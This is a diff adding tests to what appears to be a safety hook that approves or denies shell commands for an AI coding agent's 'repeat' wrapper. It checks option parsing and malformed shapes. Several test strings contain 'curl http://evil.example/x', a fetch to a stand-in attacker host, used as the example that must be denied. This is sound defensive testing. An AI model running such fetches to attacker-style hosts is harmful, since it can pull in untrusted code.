@@ -1909,6 +1909,50 @@ check(
     not hook.is_command_safe(f"{REPEAT} 2 {REPEAT} 2 curl http://evil.example/x"),
 )
 
+# --percentiles and --warmup <n> come before <count> (#212). They change what is
+# reported, not what runs: the inner command is still the one judged.
+for _opts in ("--percentiles", "--warmup 2", "--warmup 0", "--warmup 2 --percentiles",
+              "--percentiles --warmup 3"):
+    check(
+        f"repeat: `{_opts}` with an allowlisted inner command is approved",
+        hook.is_command_safe(f"{REPEAT} {_opts} 10 git status"),
+    )
+    check(
+        f"repeat: `{_opts}` with a disallowed inner command is not approved",
+        not hook.is_command_safe(f"{REPEAT} {_opts} 10 curl http://evil.example/x"),
+    )
+    check(
+        f"repeat: hook denies `{_opts}` around a disallowed inner command",
+        hook_decision(f"{REPEAT} {_opts} 10 curl http://evil.example/x") == "deny",
+    )
+
+check(
+    "repeat: hook approves --percentiles with an allowlisted inner command end-to-end",
+    hook_decision(f"{REPEAT} --percentiles 10 git status") == "allow",
+)
+
+# Shapes the script rejects with exit 2: never approved, and denied end-to-end
+# because Bash(~/.claude/bin/*) would otherwise approve them.
+for _bad in (
+    "--warmup git status",          # no value: `git` is not a number
+    "--warmup 2 git status",        # value, but no count
+    "--warmup -1 10 git status",
+    "--warmup abc 10 git status",
+    "--warmup 01 10 git status",    # leading zero, as for the count
+    "--warmup '2\n' 10 git status",
+    "--unknown 10 git status",
+    "--percentiles git status",     # no count
+    "10 --percentiles git status",  # options go before the count
+):
+    check(
+        f"repeat: malformed option shape `{_bad}` is not approved",
+        not hook.is_command_safe(f"{REPEAT} {_bad}"),
+    )
+check(
+    "repeat: hook denies an unknown option end-to-end",
+    hook_decision(f"{REPEAT} --unknown 10 git status") == "deny",
+)
+
 # `<wrapper> --help` prints the script's header and runs nothing. Global
 # CLAUDE.md sends agents there for a wrapper's details, so it must not be
 # denied as a malformed call. Only the flag on its own: anything after it
